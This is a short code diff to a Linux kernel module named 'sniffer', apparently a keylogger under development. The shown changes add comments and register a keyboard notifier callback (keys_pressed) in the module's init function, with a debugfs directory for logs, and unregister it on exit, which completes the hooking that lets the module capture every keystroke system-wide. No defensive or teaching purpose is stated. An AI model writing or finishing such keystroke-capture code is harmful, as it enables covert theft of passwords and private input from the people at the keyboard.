@@ -49,7 +49,13 @@ int keys_pressed(struct notifier_block *nblock, unsigned long code,
             return NOTIFY_OK
         }
 
-}                      
+}     
+
+/**
+ * entry point
+ * Creates log directory
+ * Registers the keyboard structure
+**/                 
 static int __init sniffer_init(void){
     // set up log diretory
     // I'm using debugfs rn for testing, future feature should be able
@@ -71,12 +77,17 @@ static int __init sniffer_init(void){
         return -ENOENT;
     }
     
-    
+    //main stuff
+    register_keyboard_notifier(&nb);
     return 0;
 }
 
+/**
+    Exit function
+    - Unregisters the module from the kernel
+**/
 static void __exit sniffer_exit(void){
-
+    unregister_keyboard_notifier(&nb);
 }
 
 module_init(sniffer_init);
